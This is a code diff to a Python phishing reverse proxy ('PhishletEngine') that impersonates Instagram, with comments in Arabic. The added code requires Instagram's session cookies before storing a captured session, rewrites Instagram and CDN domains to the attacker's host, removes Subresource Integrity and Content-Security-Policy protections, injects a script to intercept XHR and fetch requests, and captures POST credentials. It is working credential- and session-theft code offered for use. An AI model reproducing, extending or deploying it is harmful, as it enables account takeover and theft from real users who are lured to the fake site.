@@ -157,8 +157,12 @@ class PhishletEngine:
         if not cookies_dict:
             for cookie in cookies_jar:
                 cookies_dict[cookie.name] = cookie.value
-        has_auth = any(k in cookies_dict for k in self.auth_tokens)
-        if cookies_dict and has_auth:
+
+        # قائمة الكوكيز الأساسية التي تضمن صلاحية الجلسة (مستوحاة من المحادثة)
+        essential_cookies = ['sessionid', 'ds_user_id', 'csrftoken', 'rur']
+        has_essential = all(k in cookies_dict for k in essential_cookies)
+
+        if cookies_dict and has_essential:
             session_id = datetime.now().strftime("%y%m%d_%H%M%S")
             captured_sessions[session_id] = {
                 'site': self.name,
@@ -178,7 +182,6 @@ class PhishletEngine:
             return session_id
         return None
 
-    # ======================== دالة إعادة الكتابة المتطورة (مدمجة مع التحسينات) ========================
     def rewrite_content(self, content, content_type, current_host):
         if not content_type or not any(t in content_type.lower() for t in ['text/html', 'application/javascript', 'text/css', 'application/json']):
             return content
@@ -186,9 +189,8 @@ class PhishletEngine:
             if isinstance(content, bytes):
                 content = content.decode('utf-8', errors='ignore')
             
-            # قائمة موسعة بالنطاقات (من الكود الجديد)
+            # قائمة موسعة بالنطاقات
             all_domains = ['instagram.com', 'cdninstagram.com', 'fbcdn.net']
-            # استبدال شامل لكل النطاقات
             for domain in all_domains:
                 # https://any.sub.domain
                 content = re.sub(rf'https?://(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}', f'https://{current_host}', content)
@@ -196,17 +198,15 @@ class PhishletEngine:
                 content = re.sub(rf'//(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}', f'//{current_host}', content)
                 # داخل علامات الاقتباس (لـ JSON/JS)
                 content = re.sub(rf'(["''])(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}(["''])', rf'\1{current_host}\2', content)
-                # استبدال النقاط المهربة (مهم في بعض ملفات JS)
+                # استبدال النقاط المهربة
                 content = content.replace(domain.replace('.', r'\.'), current_host.replace('.', r'\.'))
 
-            # إزالة integrity لمنع SRI
+            # إزالة الحمايات
             content = re.sub(r'integrity="[^"]+"', '', content)
-            # إزالة CSP من meta tags
             content = re.sub(r'<meta[^>]*http-equiv=["\']Content-Security-Policy["\'][^>]*>', '', content)
-            # إخفاء رأس CSP في النص
             content = content.replace('Content-Security-Policy', 'X-Ignored-CSP')
 
-            # حقن سكريبت متطور لاعتراض طلبات XMLHttpRequest (من الكود الجديد)
+            # حقن سكريبت متطور لاعتراض طلبات XMLHttpRequest و fetch
             if '<head>' in content:
                 script = f"""<script>
                 (function() {{
@@ -307,13 +307,18 @@ def proxy(path):
     if request.query_string:
         target_url += '?' + request.query_string.decode('utf-8')
 
-    # تجهيز الرؤوس مع تعطيل الضغط (تحسين من الكود الجديد)
+    # تجهيز الرؤوس مع إضافة هيدرات إنستجرام الضرورية (تحسين من المحادثة)
     headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'content-length', 'accept-encoding', 'connection']}
     headers['Host'] = engine.target_domain
     headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-    headers['Accept-Encoding'] = 'identity'  # تعطيل الضغط لضمان إعادة الكتابة الصحيحة
+    headers['Accept-Encoding'] = 'identity'  # تعطيل الضغط
     headers['Referer'] = f"https://{engine.target_domain}/"
     headers['Origin'] = f"https://{engine.target_domain}"
+    # هيدرات خاصة بإنستجرام (مهمة جداً)
+    if 'X-Csrftoken' in request.headers:
+        headers['X-CSRFToken'] = request.headers['X-Csrftoken']
+    headers['X-Instagram-AJAX'] = '1'
+    headers['X-Requested-With'] = 'XMLHttpRequest'
 
     # التقاط بيانات POST
     captured_creds_data = None
